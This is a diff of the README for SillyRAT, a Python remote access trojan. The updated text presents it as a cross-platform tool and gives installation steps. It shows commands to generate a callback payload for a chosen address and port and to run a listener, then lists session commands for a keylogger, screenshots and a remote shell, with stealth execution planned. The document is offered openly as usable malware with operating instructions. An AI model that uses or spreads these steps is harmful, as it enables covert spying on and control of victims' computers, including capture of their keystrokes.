@@ -1,46 +1,103 @@
 <h1 align="center"> 
-    <img src="https://user-images.githubusercontent.com/29171692/84916978-61e65480-b0dc-11ea-95c0-9cc625292966.png" alt="SillyRAT" /> <br>    
+    <img src="https://user-images.githubusercontent.com/29171692/89164677-00e3e480-d595-11ea-9cf1-f27ab1faf432.png" alt="SillyRAT" /> <br>    
     SillyRAT
 </h1>
-<h4 align="center"> A Remote Administration Tool (RAT/Trojan) For Windows.</h4>
-<p>This tool has two seperate parts: </p>
-<ul>
-    <li><b>Server Part : </b><i>Linux</i> Complete [An interactive Interface for handling Clients]</li>
-    <li><b>Client Part &nbsp;: </b><i>Windows</i> Under Development [A Stealth Script, to be executed on target Computer]</li>
-</ul>
+<h4 align="center"> A Cross Platform multifunctional (Windows/Linux/Mac) RAT.</h4>
+
+<h6 align="center"><img src="https://user-images.githubusercontent.com/29171692/89173201-81104700-d5a1-11ea-8d93-f1d6eedc11c6.png"></h6>
 
 ## Getting Started
+### Description
+A cross platform RAT written in pure Python. The RAT accept commands alongside arguments to either perform as the server who accepts connections or to perform as the client/target who establish connections to the server. The **generate** command uses the module **pyinstaller** to compile the actual payload code. So, in order to generate payload file for your respective platform, you need to be on that platform while generating the file. Moreover, you can directly get the soure file as well. 
+
 ### Features
 <ul>
-    <li>Command Execution</li>
-    <li>Screenshot</li>
-    <li>Persistence</li>
-    <li>Encoded Transmission</li>
-    <li>CLI interface for Linux</li>
+    <li>Built-in Shell for command execution</li>
+    <li>Dumping System Information including drives and rams</li>
+    <li>Screenshot module. Captures screenshot of client screen.</li>
+    <li>Connection Loop (Will continue on connecting to server)</li>
+    <li>Currently, it uses BASE64 encoding. </li>
+    <li>Pure Python</li>
+    <li>Cross Platform. (Tested on Linux. Errors are accepted)</li>
+    <li>Source File included for testing</li>
+    <li>Python 3</li>
 </ul>
 
-### Under Development
+### To be expected in future
 <ul>
-    <li>Shellpop. Popping Stealthing shells through shellpop utility</li>
-    <li>Powershell</li>
-    <li>Downloading and Uploading Files</li>
+    <li>Stealth Execution</li>
+    <li>Encryption</li>
+    <li>Storing Sessions from last attempt</li>
+    <li>Pushing Notifications when a client connects</li>
 </ul>
-
-### Updates
-The tool is being ported to Python...
 
 ### Installation
-Currently, you have to compile from the source code. As soon as the Client Part is fully functionaly and complete, we will provide binaries. The **.cpp** file in **client** folder is currently in testing phase and is only provided to test the working of server interface. Following commands will do the necessary work: 
+The tool is tested on **Parrot OS** with **Python 3.8**. 
+Follow the steps for installation:
 ```
 $ git clone https://github.com/hash3liZer/SillyRAT.git
 $ cd SillyRAT/
-$ chmod 755 install.sh
-$ ./install.sh
+$ pip3 install -r requirements.txt
 ```
-This will compile and place `sillyrat` in current directory. Execute: 
+
+## Documentation
+### Generating Payload
+You can get the payload file in two ways: 
+<ul>
+    <li>Source File</li>
+    <li>Compiled File</li>
+</ul>
+The source file is to remain same on all platforms. So, you can generate it on one platform and use it on the other. Getting the source file: 
+
 ```
-$ ./sillyrat
+$ python3 server.py generate --address 134.276.92.1 --port 2999 --output /tmp/payload.py --source
 ```
+
+The compiled version has to generated on the respective platform. For example, you can't generate an .exe file on Linux. You specifically have to be on Windows. The tool is still under testing. So, all kinds of errors are accepted. Make sure to open an issue though. Generating the Compiled Version for Linux:
+
+```
+$ python3 server.py generate --address 134.276.92.1 --port 2999 --output /tmp/filer
+```
+
+<h6 align="center"><img src="https://user-images.githubusercontent.com/29171692/89173322-b74dc680-d5a1-11ea-8b3b-e5aa83cfbda1.png"></h6>
+
+Replace your IP Address and Port on above commands. 
+
+### Running Server
+The server must be executed on Linux. You can buy a VPS or Cloud Server for connections. For the record, the server doesn't store any session from last run. So, all the progress will lost once the server application gets terminated. Running your server:
+```
+$ python3 sillyrat.py bind --address 0.0.0.0 --port 2999
+```
+
+### Connections
+All the connections will be listed under **sessions** command:
+```
+$ sessions
+```
+
+<h6 align="center"><img src="https://user-images.githubusercontent.com/29171692/89171634-152cdf00-d59f-11ea-83a6-0344f370113a.png"></h6>
+
+You can connect to you target session with **connect** command and launch one of available commands: 
+```
+$ connect ID
+$ keylogger on
+$ keylogger dump
+$ screenshot
+```
+
+<h6 align="center"><img src="https://user-images.githubusercontent.com/29171692/89172191-d9464980-d59f-11ea-988c-9986b52642e7.png"></h6>
+
+### Help
+Get a list of available commands: 
+```
+$ help
+```
+
+Help on a Specific Command:
+```
+$ help COMMAND
+```
+
 ## Screenshots
 <h6 align="center"><img src="https://user-images.githubusercontent.com/29171692/84919904-23eb2f80-b0e0-11ea-81b6-49f336818651.png"></h6>
 <h6 align="center"><img src="https://user-images.githubusercontent.com/29171692/84920148-6b71bb80-b0e0-11ea-811b-bfa5bd0e3945.png"></h6>
